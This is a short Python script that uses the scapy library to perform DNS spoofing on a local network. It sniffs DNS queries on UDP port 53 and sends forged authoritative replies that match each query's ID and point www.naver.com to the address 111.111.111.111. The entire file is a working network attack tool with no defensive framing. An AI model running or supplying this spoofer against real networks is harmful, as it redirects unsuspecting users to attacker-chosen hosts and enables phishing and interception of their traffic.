from scapy.all import *


def dnsSpoof(packet):
    spoofDNS = "111.111.111.111"
    dstip = packet[IP].src
    srcip = packet[IP].dst
    sport = packet[UDP].sport
    dport = packet[UDP].dport

    if packet.haslayer(DNSQR):
        dnsid = packet[DNS].id
        qd = packet[DNS].qd
        dnsrr = DNSRR(rrname="www.naver.com", ttl=100, rdata=spoofDNS)
        spoofPacket = (
            IP(dst=dstip, src=srcip)
            / UDP(dport=sport, sport=dport)
            / DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
        )
        send(spoofPacket)
        print("+++ SOURCE[%s] -> DEST[%s] " % (dstip, srcip))
        print(spoofPacket.summary)


def main():
    print("+++DNS Spoof start...")
    sniff(filter="udp port 53", store=0, prn=dnsSpoof)


if __name__ == "__main__":
    main()

